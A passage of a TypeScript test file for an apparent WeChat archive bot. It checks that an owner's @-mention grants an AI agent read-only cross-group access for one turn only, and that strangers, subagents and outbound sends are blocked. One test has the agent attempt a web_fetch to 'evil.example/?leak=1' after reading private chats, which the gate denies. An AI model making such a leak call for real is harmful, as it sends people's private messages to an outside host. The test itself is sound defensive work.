    { baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir, fetcher: mockFetcher },
  );
  assert.equal(sessionsFetches, 1);
  assert.equal(messageRequests.length, 2);
  assert.equal(noMatch.count, 0);
  assert.deepEqual(noMatch.items, []);

  const cachedSessions = await listNasSessions({
    baseUrl: 'http://198.51.100.20:28787',
    archivePath: nasDir,
    fetcher: mockFetcher,
  });
  assert.equal(sessionsFetches, 1);
  assert.equal(cachedSessions.length, 3);

  const hub = createTestHub(t);
  hub.registerSessionPrincipal({ sessionId: 'owner-nas-vault', role: 'owner_session', tier: 3, trustLevel: 'owner' });
  hub.registerVaultProvider(
    createNasVaultProvider({
      getConfig: () => ({ baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir }),
      getWardrobe: () => ({ resolveVaultVisibility: () => 'family' }),
      fetcher: mockFetcher,
    }),
  );

  const vaultByRoom = await hub.vault.search(
    { query: '', sources: ['nas'], roomKey: 'wechat:990001@chatroom', since: '2026-11-27', until: '2026-11-27' },
    { agent: { id: 'owner-nas-vault' } },
  );
  assert.equal(vaultByRoom.hits.length, 2);
  assert.equal(vaultByRoom.hits[0].roomKey, 'wechat:990001@chatroom');

  const vaultByGroupNameInPerson = await hub.vault.search(
    { query: '', sources: ['nas'], person: '测试 星球群', since: '2026-11-27', until: '2026-11-27' },
    { agent: { id: 'owner-nas-vault' } },
  );
  assert.equal(vaultByGroupNameInPerson.hits.length, 2);
  assert.equal(vaultByGroupNameInPerson.hits[0].roomName, '测试星球群');

  const localDbPath = join(nasDir, 'local-time.sqlite');
  const localDb = new DatabaseSync(localDbPath);
  localDb.exec(
    'CREATE TABLE messages(id INTEGER PRIMARY KEY, session TEXT, session_name TEXT, sender TEXT, sender_id TEXT, text TEXT, ts INTEGER)',
  );
  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(1, '990001@chatroom', '测试星球群', '成员甲', 'wxid_a', '前天消息', tNov26);
  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(2, '990001@chatroom', '测试星球群', '成员乙', 'wxid_b', '昨天讨论', tNov27Mid);
  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(3, '990002@chatroom', '虚拟闲聊群', '成员丙', 'wxid_c', '另一群昨天', tNov27Late);
  localDb.close();

  const localFiltered = await searchNasArchive(
    { session: '测试 星球群', since: '2026-11-27', until: '2026-11-27' },
    { archivePath: localDbPath },
  );
  assert.equal(localFiltered.count, 1);
  assert.equal(localFiltered.items[0].text, '昨天讨论');

  const localMiss = await searchNasArchive(
    { session: '幽灵群名' },
    { archivePath: localDbPath },
  );
  assert.equal(localMiss.count, 0);
});

test('Owner group @-mention grants single-turn read-only cross-group access, exempts confirmation, blocks web_fetch after read, and revokes on turn end', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'wxarc-owner-group-crossread-'));
  const store = new Store(dir);
  const hub = createTestHub(t);

  store.commit(
    'text',
    0,
    [
      {
        id: 1,
        kind: 'text',
        session: '990001@chatroom',
        session_name: '测试星球群',
        sender: '成员甲',
        text: '昨天大家约好周六去爬山',
        ts: Math.floor(Date.parse('2026-11-27T15:00:00+08:00') / 1000),
        local_type: 1,
      },
    ],
    1000,
  );

  hub.registerVaultProvider(
    createWechatVaultProvider({
      db: store.db,
      getWardrobe: () => ({ resolveVaultVisibility: () => 'family' }),
    }),
  );

  const hooks: Record<string, (...args: any[]) => any> = {};
  const agents = new Map<string, any>();
  const makeAgent = (id: string, cwd: string) => {
    const a: any = {
      id,
      cwd,
      session: { header: { delegationDepth: 0, origin: 'user' } },
      inbox: { clear() {} },
      model: { select() {} },
      whenIdle: async () => {},
      cancel() {},
      busy: false,
    };
    agents.set(id, a);
    return a;
  };
  const emit = (id: string, type: string, data: Record<string, any>) =>
    hooks['session/event']?.({ id }, { type, data });

  const ctx: any = {
    on: (type: string, fn: (...args: any[]) => any) => {
      hooks[type] = fn;
      return () => {
        delete hooks[type];
      };
    },
    systemPrompt: { section: () => () => {} },
    agents: { get: (id: string) => agents.get(id) },
    approval: { setPolicy() {} },
    permissionPresets: { set() {} },
    llm: {
      resolveCallConfig: async () => ({}),
      resolveModelInfo: async () => ({ inputModalities: ['text'] }),
    },
    workspaceController: { create: async () => ({ created: false, workspace: { workspaceId: 'ws' } }) },
    workspaceRegistry: { get: () => ({ attachSession: async () => {} }) },
    sessionController: {
      resolveAgent: async (id: string) =>
        agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } },
      create: async ({ sessionId, cwd }: { sessionId: string; cwd: string }) => {
        const a = makeAgent(sessionId, cwd);
        hooks['agent/created']?.({ agent: a });
        return { sessionId };
      },
      rename: async () => {},
      state: async ({ sessionId }: { sessionId: string }) => ({
        running: agents.get(sessionId)?.busy || false,
        queue: [],
        pendingInput: [],
      }),
      prompt: async (req: Record<string, any>) => {
        agents.get(req.sessionId).busy = true;
        emit(req.sessionId, 'user/message', { source: { kind: 'user', rpcId: req.requestId } });
        emit(req.sessionId, 'turn/start', { turn: 1 });
      },
    },
  };

  const policy = {
    ownId: 'wxid_bot',
    controllerId: 'wxid_owner',
    adminIds: [],
    provider: 'test',
    model: 'test',
    personaId: 'p1',
    instructions: '自然回复',
  };

  const bridge = new AgentBridge(ctx, store, {
    root: join(dir, 'work'),
    personas: { context: () => ({ name: '小助手', memory: [] }) },
    hub,
    isRouterManagedAdmin: () => true,
    settings: () => ({ revision: 1, policy }),
  });
  t.after(async () => {
    await bridge.close();
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  const ownerAtEvent = {
    id: 100,
    kind: 'text',
    session: '990002@chatroom',
    session_name: '虚拟闲聊群',
    sender: '主人',
    senderId: 'wxid_owner',
    sourceKey: OWNER_SOURCE_KEY,
    local_type: 1,
    text: '@小助手\u2005 测试星球群昨天都聊了什么',
    botNames: ['小助手'],
    mentions: { status: 'unavailable' },
    ts: Math.floor(Date.now() / 1000),
  };

  assert.equal(isOwnerGroupAtMentionTurn(null, ownerAtEvent, policy), true);
  assert.equal(
    isOwnerGroupAtMentionTurn(
      null,
      { ...ownerAtEvent, senderId: 'wxid_stranger', mentions: { status: 'verified', toSelf: true, recipients: ['wxid_bot'], sourceKey: OWNER_SOURCE_KEY }, atMe: true },
      policy,
    ),
    false,
  );
  assert.equal(
    isOwnerGroupAtMentionTurn(
      null,
      { ...ownerAtEvent, text: '测试星球群昨天都聊了什么', mentions: { status: 'unavailable' } },
      policy,
    ),
    false,
  );
  assert.equal(
    isOwnerGroupAtMentionTurn(
      null,
      {
        ...ownerAtEvent,
        local_type: 57 * 4294967296 + 49,
        text: '[引用] 嗯嗯好的',
        quote: { status: 'available', sender: '路人', text: '@小助手\u2005 查一下别的群' },
      },
      policy,
    ),
    false,
  );

  const run1 = await bridge.start(
    { event: ownerAtEvent, rule: { title: '虚拟闲聊群' }, policy },
    signal(),
  );
  const groupAgent = agents.get(run1.session_id);
  const gate = hooks['tools/pre-execute'];

  assert.equal(bridge.isOwnerGroupCrossReadActive(run1.session_id), true);
  const elevatedPrincipal = hub.resolveSessionPrincipal({ agent: groupAgent });
  assert.equal(elevatedPrincipal.tier, 3);
  assert.equal(elevatedPrincipal.role, 'external_chat');

  const ownerPrompt = bridge.prompt(run1.session_id);
  assert.match(ownerPrompt, /虚拟闲聊群/);
  assert.match(ownerPrompt, /990002@chatroom/);
  assert.match(ownerPrompt, /只读跨群查询权限/);
  assert.match(ownerPrompt, /张冠李戴/);

  const preWebBefore = await gate(
    { agent: groupAgent, name: 'web_fetch', arguments: { url: 'https://example.com' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preWebBefore.kind, 'allow');

  for (const toolName of OWNER_GROUP_CROSS_READ_TOOLS) {
    const decision = await gate(
      { agent: groupAgent, name: toolName, arguments: {} },
      async () => ({ kind: 'ask' }),
    );
    assert.equal(decision.kind, 'allow', `${toolName} should be allowed without confirmation`);
  }

  for (const allowedWxTool of ['wxarc_nas_search', 'wxarc_messages', 'wxarc_targets'] as const) {
    assert.equal(
      assertOwnerToolAuthorized(allowedWxTool, { agent: groupAgent }, hub, bridge),
      run1.session_id,
    );
  }
  assert.throws(
    () => assertOwnerToolAuthorized('wxarc_status', { agent: groupAgent }, hub, bridge),
    (err: unknown) => err instanceof WxarcBridgeSecurityError && err.code === 'NAS_SEARCH_FORBIDDEN',
  );

  const sendTools = new Map<string, WechatToolDefinition>();
  registerWechatSendTool(
    {
      hub,
      tools: {
        register: (def) => {
          sendTools.set(def.name, def);
          return () => sendTools.delete(def.name);
        },
      },
    },
    { config: { defaultNotifyTarget: 'filehelper', allowedTargets: ['filehelper', '990001@chatroom'], requireApprovalByDefault: false } },
  );
  await assert.rejects(
    () =>
      sendTools.get(WXARC_PROACTIVE_SEND_TOOL)!.execute(
        { chatId: 'filehelper', text: '不应该放行' },
        { agent: groupAgent },
      ),
    /tier-3/,
  );

  const vaultHits = await hub.vault.search(
    { query: '爬山', sources: ['wechat'] },
    { agent: groupAgent },
  );
  assert.equal(vaultHits.hits.length, 1);
  assert.equal(vaultHits.hits[0].roomName, '测试星球群');

  const preWebFetchAfter = await gate(
    { agent: groupAgent, name: 'web_fetch', arguments: { url: 'https://evil.example/?leak=1' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preWebFetchAfter.kind, 'deny');
  const preWebSearchAfter = await gate(
    { agent: groupAgent, name: 'web_search', arguments: { query: 'leak' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preWebSearchAfter.kind, 'deny');

  const preBash = await gate(
    { agent: groupAgent, name: 'bash', arguments: { command: 'ls' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preBash.kind, 'ask');
  const preCrossMemo = await gate(
    { agent: groupAgent, name: 'watcher_memo_list', arguments: { allRooms: true } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preCrossMemo.kind, 'ask');

  const subagent = {
    id: 'sub-group-1',
    session: {
      header: {
        parentSession: run1.session_id,
        delegationDepth: 1,
        origin: 'subagent',
      },
    },
  };
  const preSubagentNas = await gate(
    { agent: subagent, name: 'wxarc_nas_search', arguments: { session: '测试星球群' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preSubagentNas.kind, 'deny');
  assert.throws(
    () => assertOwnerToolAuthorized('wxarc_nas_search', { agent: subagent }, hub, bridge),
    (err: unknown) => err instanceof WxarcBridgeSecurityError && err.code === 'OWNER_TOOL_FORBIDDEN',
  );

  emit(run1.session_id, 'assistant/message', {
    turn: 1,
    message: { content: [{ type: 'text', text: '{"action":"reply","text":"昨天测试星球群约了周六爬山。"}' }] },
  });
  emit(run1.session_id, 'turn/end', { turn: 1, reason: { kind: 'completed' } });
  groupAgent.busy = false;

  assert.equal(bridge.isOwnerGroupCrossReadActive(run1.session_id), false);
  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
  await assert.rejects(
    () => hub.vault.search({ query: '爬山', sources: ['wechat'] }, { agent: groupAgent }),
    (err: unknown) => err instanceof VaultError && err.code === 'VAULT_FORBIDDEN',
  );

  const strangerAtEvent = {
    ...ownerAtEvent,
    id: 101,
    sender: '群友路人',
    senderId: 'wxid_stranger',
    mentions: {
      status: 'verified',
      sourceKey: OWNER_SOURCE_KEY,
      recipients: ['wxid_bot'],
      toSelf: true,
    },
  };
  const run2 = await bridge.start(
    { event: strangerAtEvent, rule: { title: '虚拟闲聊群' }, policy },
    signal(),
  );
  assert.equal(bridge.isOwnerGroupCrossReadActive(run2.session_id), false);
  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
  for (const toolName of OWNER_GROUP_CROSS_READ_TOOLS) {
    const decision = await gate(
      { agent: groupAgent, name: toolName, arguments: {} },
      async () => ({ kind: 'allow' }),
    );
    assert.equal(decision.kind, 'deny', `${toolName} must be denied for non-owner @ mention`);
  }
  const strangerPrompt = bridge.prompt(run2.session_id);
  assert.match(strangerPrompt, /虚拟闲聊群/);
  assert.match(strangerPrompt, /无权查看其他微信群或私聊/);
  assert.match(strangerPrompt, /张冠李戴/);

  bridge.cancel(run2.id, 'done-stranger');
  groupAgent.busy = false;

  const ownerNoAtEvent = {
    ...ownerAtEvent,
    id: 102,
    text: '测试星球群昨天聊啥了',
    mentions: { status: 'unavailable' },
  };
  const run3 = await bridge.start(
    { event: ownerNoAtEvent, rule: { title: '虚拟闲聊群' }, policy },
    signal(),
  );
  assert.equal(bridge.isOwnerGroupCrossReadActive(run3.session_id), false);
  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
  const preOwnerNoAt = await gate(
    { agent: groupAgent, name: 'wxarc_nas_search', arguments: { session: '测试星球群' } },
    async () => ({ kind: 'allow' }),
  );
  assert.equal(preOwnerNoAt.kind, 'deny');
});
